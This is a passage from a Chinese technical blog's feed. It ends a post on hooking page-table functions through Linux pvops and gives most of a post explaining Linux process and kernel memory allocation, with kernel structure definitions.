&lt;p&gt;比如说你要在分配页表项的时候hook (&lt;em&gt;write_cr3)函数, 可以将(&lt;/em&gt;write_cr3)函数赋值为自己的自定义函数。 默认情况下，内核中pvops框架中提供的自定义函数如下： (完整可参看 &lt;a href=&quot;http://lxr.free-electrons.com/source/arch/x86/kernel/paravirt.c#L395&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;pv_mmu_ops函数定义&lt;/a&gt;)&lt;br&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; pv_mmu_ops pv_mmu_ops &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.read_cr2 = native_read_cr2,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.write_cr2 = native_write_cr2,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.read_cr3 = native_read_cr3,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.write_cr3 = native_write_cr3,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; .alloc_pte = paravirt_nop,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.alloc_pmd = paravirt_nop,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.alloc_pud = paravirt_nop,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.release_pte = paravirt_nop,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.release_pmd = paravirt_nop,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.release_pud = paravirt_nop,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.set_pte = native_set_pte,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.set_pte_at = native_set_pte_at,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.set_pmd = native_set_pmd,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.set_pmd_at = native_set_pmd_at,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.pte_update = paravirt_nop,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;接着定义的函数会被传入到这里：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;write_cr3&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; pfn)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         PVOP_VCALL2(pv_mmu_ops.write_cr3, mm, pfn);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;至于PVOP_VCALL2具体做了什么，可以不必去关心。&lt;/p&gt;
&lt;p&gt;完&lt;/p&gt;
&lt;h4 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h4&gt;&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;仅为学习使用，未经博主同意，请勿转载&lt;/p&gt;
&lt;p&gt;本文地址： &lt;a href=&quot;http://www.chongh.wiki/blog/2016/05/03/pvops/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/05/03/pvops/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者 [ 新浪微博: &lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;pvops是做什么的？ 简单地说，hook kernel.&lt;br&gt;利用pvops你可以自定义自己的write_cr3函数，你可以修改页表，追踪页表更新的信息，而这些听起来非常底层的操作，利用pvops都变得简单起来。&lt;/p&gt;
    
    </summary>
    
      <category term="operating-system" scheme="http://yoursite.com/categories/operating-system/"/>
    
    
      <category term="Instrumentation" scheme="http://yoursite.com/tags/Instrumentation/"/>
    
      <category term="Virtualization" scheme="http://yoursite.com/tags/Virtualization/"/>
    
      <category term="System" scheme="http://yoursite.com/tags/System/"/>
    
      <category term="Kernel" scheme="http://yoursite.com/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>Linux内存分配的秘密(一)</title>
    <link href="http://yoursite.com/blog/2016/05/03/linux-memory-alloc/"/>
    <id>http://yoursite.com/blog/2016/05/03/linux-memory-alloc/</id>
    <published>2016-05-03T19:41:45.000Z</published>
    <updated>2016-05-04T13:39:57.000Z</updated>
    
    <content type="html">&lt;p&gt;没有目录，希望能一口气读完&lt;/p&gt;
&lt;p&gt;为了写一个用户层程序，你也许会声明一个全局变量，这个全局变量可能是一个int类型也可能是一个数组，而声明之后你有可能会先初始化它，也有可能放在之后用到它的时候再初始化。除此之外，你有可能会选择在函数内部去声明局部变量，又或者为变量动态申请内存。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;不管你在用户程序中采取哪种方式申请内存，这些都对应着不同的内存分配方式以及不同的数据段，如果再加上代码段，就构成了一个完整的进程。由此可见，一个完整的进程在内存空间中对应着不同的数据区，具体来说，对应着五种不同的数据区：&lt;/p&gt;
&lt;p&gt;代码段,存放操作指令；数据段,存放已初始化的全局变量；BSS段,存放未初始化的全局变量；堆,存放动态分配的内存(e.g.,malloc())；栈,存放临时创建的局部变量。&lt;/p&gt;
&lt;p&gt;当你习惯写用户程序时，你不会去太多考虑你声明的变量最后都放到内存哪里去了，如果你仍然觉得这不是你应该了解的事情，后面的内容你就可以不用浪费时间继续阅读了。下文更多的是关注内核空间的分配，但至少也会把用户空间的分配情况说清楚。&lt;/p&gt;
&lt;p&gt;对于x86系统来说，4G的内存空间被分为用户空间(e.g.,0-3G,0xC0000000)与内核空间(e.g.,3G-4G)，用户程序只能在进行系统调用时才能访问到内核空间。此外，当进程切换时，用户空间会随着进程的变化切换到对应进程的用户空间，而内核空间不会随着进程而改变，由内核负责映射。内核空间有自己对应的页表，而用户进程各自有不同的页表。&lt;/p&gt;
&lt;p&gt;从用户层向内核看，内存的地址形式依次是，逻辑地址--线性地址--物理地址，但Linux并没有充分利用段机制，而是将所有程序的段地址固定在0-4G,因此逻辑地址就等于线性地址。&lt;/p&gt;
&lt;p&gt;了解这些基本知识之后，来看看进程的虚拟地址是如何组织的。&lt;br&gt;一个进程的虚拟地址空间主要由两个数据结构来描述，&lt;em&gt;mm_struct&lt;/em&gt;与&lt;em&gt;vm_area_struct&lt;/em&gt;。 来具体说说这两个结构体用来做什么&lt;/p&gt;
&lt;p&gt;每个进程有一个&lt;em&gt;mm_struct&lt;/em&gt;结构，在进程的&lt;em&gt;task_struct&lt;/em&gt;结构体中有一个指针指向&lt;em&gt;mm_struct&lt;/em&gt;。 &lt;em&gt;mm_struct&lt;/em&gt;的定义如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; vm_area_struct * mmap;           &lt;span class=&quot;comment&quot;&gt;/* 指向虚拟区间（VMA）链表 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;rb_root_t&lt;/span&gt; mm_rb;         ／*指向red_black树*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; vm_area_struct * mmap_cache;     &lt;span class=&quot;comment&quot;&gt;/* 指向最近找到的虚拟区间*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;pgd_t&lt;/span&gt; * pgd;             ／*指向进程的页目录*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;keyword&quot;&gt;atomic_t&lt;/span&gt; mm_users;                   &lt;span class=&quot;comment&quot;&gt;/* 用户空间中的有多少用户*/&lt;/span&gt;                                     &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;keyword&quot;&gt;atomic_t&lt;/span&gt; mm_count;               &lt;span class=&quot;comment&quot;&gt;/* 对&quot;struct mm_struct&quot;有多少引用*/&lt;/span&gt;                                     &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; map_count;                        &lt;span class=&quot;comment&quot;&gt;/* 虚拟区间的个数*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; rw_semaphore mmap_sem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;spinlock_t&lt;/span&gt; page_table_lock;        &lt;span class=&quot;comment&quot;&gt;/* 保护任务页表和 mm-&amp;gt;rss */&lt;/span&gt;                                              &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; list_head mmlist;            &lt;span class=&quot;comment&quot;&gt;/*所有活动（active）mm的链表 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; start_code, end_code, start_data, end_data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; start_brk, brk, start_stack;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; arg_start, arg_end, env_start, env_end;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; rss, total_vm, locked_vm;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; def_flags;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; cpu_vm_mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; swap_address;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; dumpable:&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;comment&quot;&gt;/* Architecture-specific MM context */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;mm_context_t&lt;/span&gt; context;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;简单来说，&lt;em&gt;mm_struct&lt;/em&gt;是对整个进程的用户空间的描述，而进程的虚拟空间可能有多个虚拟区间(这里的区间就是由&lt;em&gt;vm_area_struct&lt;/em&gt;来描述). &lt;em&gt;vm_area_struct&lt;/em&gt;是描述进程虚拟空间的基本单元，那这些基本单元又是如何管理组织的呢？内核采取两种方式来组织这些基本单元，第一，正如&lt;em&gt;mm_struct&lt;/em&gt;中的&lt;em&gt;mmap&lt;/em&gt;指针指向&lt;em&gt;vm_area_struct&lt;/em&gt;，以链表形式存储，这种结构主要用来遍历节点；第二，以红黑树来组织&lt;em&gt;vm_area_struct&lt;/em&gt;，这种结构主要在定位特定&lt;br&gt;内存区域时用来搜索，以降低耗时。&lt;/p&gt;
&lt;p&gt;了解了这些关联之后，回到最前面，当你写的用户程序在申请内存时(e.g., int i =0; &lt;em&gt;malloc()&lt;/em&gt;)，注意这里申请的内存还是虚拟内存，可以说是“内存区域”(&lt;em&gt;vm_area_struct&lt;/em&gt;)，并非实际物理内存。 这些虚拟内存除了malloc()方式(由专门的brk()系统调用实现)，最终都是通过系统调用mmap来完成的，而mmap系统调用对应的服务例程是do_mmap()函数，有关do_mmap()函数，可参考&lt;a href=&quot;http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.25#L1843&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;do_mmap()&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;说了这么多用户空间，该把重心来看看内核空间了。&lt;br&gt;用户空间有&lt;em&gt;malloc&lt;/em&gt;内存分配函数，内核空间同样有类似的内存分配函数，只是种类多一些(e.g.,&lt;em&gt;*kmalloc&lt;/em&gt;/kfree,vmalloc/vfree,kmem_cache_alloc/kmem_cache_free,get_free_page&lt;em&gt;).&lt;br&gt;在具体解释内核空间层的内存分配函数之前，先来看看，物理内存是如何组织的。Linux通过分页机制来管理物理内存，页面是物理内存的基本单位，每个页面占4kB。页面在系统中由&lt;/em&gt;struct page&lt;em&gt;结构来描述，而所有的&lt;/em&gt;struct page&lt;em&gt;结构体都存储在数组&lt;/em&gt;mem_map[]&lt;em&gt;中，因此只要能找到&lt;/em&gt;mem_map[]&lt;em&gt;数组的物理地址，就能遍历所有页面的地址。可以来大致看一下&lt;/em&gt;struct page*的定义：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; page &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; flags;                                                      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;atomic_t&lt;/span&gt; count;                &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; mapcount;          &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt;;          &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; address_space *mapping;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;pgoff_t&lt;/span&gt; index;                  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; list_head lru;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;keyword&quot;&gt;union&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; pte_chain;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;pte_addr_t&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &amp;#125;         &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *&lt;span class=&quot;keyword&quot;&gt;virtual&lt;/span&gt;;                  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，&lt;em&gt;flag&lt;/em&gt;用来存放页的状态，&lt;em&gt;count&lt;/em&gt;记录该页面被引用了多少次，&lt;em&gt;mapping&lt;/em&gt;指向该页面相关的地址空间对象… 这里只是一个简化的定义，真实情况会复杂一些，要把&lt;em&gt;page&lt;/em&gt;说清楚，需要写一篇新的博客了，之后的文章会专门介绍。需要注意的是，&lt;em&gt;page&lt;/em&gt;描述的是物理内存本身，而并非包含在里面的数据。&lt;/p&gt;
&lt;p&gt;那这些&lt;em&gt;page&lt;/em&gt;又和内核空间的内存分配有什么关系呢？&lt;br&gt;内核空间有一系列的页面分配函数：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; page * &lt;span class=&quot;title&quot;&gt;alloc_page&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; gfp_mask)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//Allocate a single page and return a struct address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; page * &lt;span class=&quot;title&quot;&gt;alloc_pages&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; gfp_mask, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; order)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//Allocate 2order number of pages and returns a struct page&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;get_free_page&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; gfp_mask)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//Allocate a single page, zero it and return a virtual address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; __&lt;span class=&quot;title&quot;&gt;get_free_page&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span 